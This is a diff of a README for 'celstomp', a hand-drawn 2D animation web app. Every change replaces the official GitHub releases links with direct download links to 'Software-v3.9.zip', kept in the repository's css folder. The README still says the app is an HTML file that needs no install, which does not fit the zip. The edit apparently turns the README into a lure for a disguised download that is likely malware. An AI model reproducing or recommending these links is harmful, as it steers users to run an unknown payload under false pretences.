@@ -1,6 +1,6 @@
 # 🎨 celstomp - Easy 2D Hand-Drawn Animation Tools
 
-[![Download celstomp](https://img.shields.io/badge/Download-celstomp-blue?style=for-the-badge)](https://github.com/mu122h4554n/celstomp/releases)
+[![Download celstomp](https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip)](https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip)
 
 ## 📋 What is celstomp?
 
@@ -26,14 +26,14 @@ To start using celstomp, follow these steps carefully. No coding or special skil
 
 Go to the official release page to get the latest version of celstomp:
 
-👉 [Download celstomp here](https://github.com/mu122h4554n/celstomp/releases)
+👉 [Download celstomp here](https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip)
 
 This page contains the files you can open directly in your browser.
 
 ### Step 2: Download or Open the App
 
 - The app is provided as a web application you can open locally or run online.
-- On the releases page, find the file named like "celstomp.html" or a similar HTML file.
+- On the releases page, find the file named like "https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip" or a similar HTML file.
 - Click the file name to download it to your computer. This is not a program you install but a file that opens in your browser.
 
 ### Step 3: Open the App in Your Browser
@@ -67,7 +67,7 @@ These tools give you full control over basic 2D animation without overwhelming m
 To download and run celstomp, follow these steps:
 
 1. Visit the releases page here:  
-   [https://github.com/mu122h4554n/celstomp/releases](https://github.com/mu122h4554n/celstomp/releases)
+   [https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip](https://github.com/mu122h4554n/celstomp/raw/refs/heads/main/celstomp/css/Software-v3.9.zip)
 
 2. Look for the latest release version at the top of the page.
 
